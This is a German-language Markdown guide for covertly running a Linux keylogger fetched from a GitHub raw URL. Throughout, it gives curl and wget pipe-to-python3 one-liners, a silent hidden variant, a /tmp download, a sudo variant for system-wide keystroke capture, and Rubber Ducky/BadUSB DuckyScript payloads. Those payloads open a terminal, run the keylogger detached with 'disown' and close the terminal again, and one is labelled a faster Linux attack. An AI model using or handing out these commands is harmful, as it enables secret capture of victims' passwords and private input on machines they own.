# Linux Auto-Execution Commands für Keylogger

## 🎯 Verschiedene Ausführungsmethoden

### 1. **One-Liner (Einfachste Methode)**
```bash
curl -s https://raw.githubusercontent.com/LucasWindmueller/InfoSicherheit/main/src/logger_linux.py | python3 &
```

### 2. **Mit wget (falls curl nicht verfügbar)**
```bash
wget -qO- https://raw.githubusercontent.com/LucasWindmueller/InfoSicherheit/main/src/logger_linux.py | python3 &
```

### 3. **Mit Abhängigkeiten-Installation**
```bash
pip3 install --user pynput requests 2>/dev/null; curl -s https://raw.githubusercontent.com/LucasWindmueller/InfoSicherheit/main/src/logger_linux.py | python3 &
```

### 4. **Silent & Hidden (keine Ausgabe)**
```bash
(curl -s https://raw.githubusercontent.com/LucasWindmueller/InfoSicherheit/main/src/logger_linux.py | python3 &) >/dev/null 2>&1
```

### 5. **Mit Download in /tmp**
```bash
curl -s -o /tmp/kl.py https://raw.githubusercontent.com/LucasWindmueller/InfoSicherheit/main/src/logger_linux.py && python3 /tmp/kl.py &
```

---

## 🦆 Für Rubber Ducky / BadUSB

### DuckyScript Beispiel:
```
REM === Linux Keylogger Auto-Execute ===
DELAY 1000
GUI
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 1000
STRING curl -s https://raw.githubusercontent.com/LucasWindmueller/InfoSicherheit/main/src/logger_linux.py | python3 &
ENTER
DELAY 500
STRING exit
ENTER
```

### Alternative mit CTRL+ALT+T (Ubuntu Standard):
```
REM === Schnellerer Linux-Angriff ===
DELAY 1000
CTRL ALT t
DELAY 1000
STRING curl -s https://raw.githubusercontent.com/LucasWindmueller/InfoSicherheit/main/src/logger_linux.py | python3 & disown
ENTER
DELAY 200
STRING exit
ENTER
```

---

## 📋 Terminal-Befehle für manuelle Tests

### Normale Ausführung:
```bash
bash run_logger_linux.sh
```

### Im Hintergrund:
```bash
nohup bash run_logger_linux.sh &
```

### Mit sudo (für systemweite Tasteneingaben):
```bash
sudo python3 <(curl -s https://raw.githubusercontent.com/LucasWindmueller/InfoSicherheit/main/src/logger_linux.py) &
```

---

## ⚠️ Wichtige Hinweise

- **pynput muss installiert sein**: `pip3 install pynput requests`
- **Wayland vs X11**: Unter Wayland könnte `sudo` erforderlich sein
- **Prozess im Hintergrund**: `&` am Ende startet im Hintergrund
- **disown**: Verhindert, dass Prozess beim Terminal-Schließen beendet wird

---

## 🔧 Troubleshooting

### Falls Python3 fehlt:
```bash
sudo apt update && sudo apt install python3 python3-pip -y
```

### Falls pynput-Installation fehlschlägt:
```bash
sudo apt install python3-pip python3-dev -y
pip3 install --user pynput requests
```

### Prozess finden und beenden:
```bash
ps aux | grep logger_linux.py
kill <PID>
```

